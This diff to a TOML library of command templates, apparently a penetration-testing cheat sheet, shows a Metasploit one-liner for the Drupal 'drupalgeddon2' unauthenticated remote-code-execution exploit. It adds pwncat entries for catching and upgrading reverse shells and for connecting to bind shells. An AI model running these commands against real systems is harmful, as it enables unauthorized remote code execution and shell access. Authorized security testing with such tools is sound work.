@@ -833,3 +833,18 @@ name = "drupalgeddon2"
 description = "Drupal 7 <7.58 unauthenticated RCE"
 template = "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <RHOST>; set LHOST <LHOST>; run'"
 tags = ["msf", "web", "drupal", "rce"]
+
+# ───────────────────────── auto-upgrading shell handlers ─────────────────────────
+[[command]]
+category = "shells"
+name = "pwncat listener"
+description = "catch + auto-upgrade to full PTY (tab-complete, up/download)"
+template = "pwncat-cs -lp <LPORT>"
+tags = ["shell", "listener", "pwncat", "upgrade"]
+
+[[command]]
+category = "shells"
+name = "pwncat connect"
+description = "connect to a bind shell and stabilize it"
+template = "pwncat-cs <RHOST>:<RPORT>"
+tags = ["shell", "pwncat", "bind"]
